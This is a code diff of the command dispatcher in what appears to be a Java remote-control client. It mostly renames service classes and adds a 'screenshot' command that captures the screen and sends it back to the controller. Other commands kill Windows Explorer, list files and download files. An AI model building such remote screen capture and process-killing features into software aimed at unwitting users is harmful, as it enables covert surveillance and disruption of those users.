@@ -2,10 +2,7 @@ package ch.lebois.client.handler;
 
 import ch.lebois.client.configure.ClientValues;
 import ch.lebois.client.console.Console;
-import ch.lebois.client.service.BonziFunctions;
-import ch.lebois.client.service.DownloadService;
-import ch.lebois.client.service.ListFilesFunction;
-import ch.lebois.client.service.Printer;
+import ch.lebois.client.service.*;
 import ch.lebois.client.service.chat.Chat;
 
 import java.util.Collections;
@@ -50,20 +47,20 @@ public class CommandReader {
     private static boolean functions(String command) {
         boolean isFunction = true;
         if (command.startsWith("ls")) {
-            new ListFilesFunction().listFiles(command);
+            new ListService().listFiles(command);
         } else if (command.equals("pwd")) {
             new ResponseSender("response", "Java Home   | " + System.getProperty("java.home"));
             new ResponseSender("response", "Home Dir    | " + System.getProperty("user.home"));
             new ResponseSender("response", "Current Dir | " + System.getProperty("user.dir"));
             new ResponseSender().reset();
         } else if (command.equals("kill")) {
-            new BonziFunctions().killExplorer();
+            new BonziService().killExplorer();
             new ResponseSender().reset();
         } else if (command.equals("desktop")) {
-            new BonziFunctions().showDesktop();
+            new BonziService().showDesktop();
             new ResponseSender().reset();
         } else if (command.equals("printer")) {
-            new Printer().getPrinters();
+            new PrinterService().getPrinters();
             new ResponseSender().reset();
         } else if (command.startsWith("download")) {
             new DownloadService().download(command.split(" ")[1], command.split(" ")[2]);
@@ -71,6 +68,9 @@ public class CommandReader {
         } else if (command.startsWith("chat")) {
             Chat chat = Chat.getInstance();
             chat.addMessage("Morgan", command.replace("chat ", ""));
+            new ResponseSender().reset();
+        } else if (command.equals("screenshot")) {
+            new ImageService().sendImgBytes(new ImageService().takeScreenshot());
             new ResponseSender().reset();
         } else {
             isFunction = false;
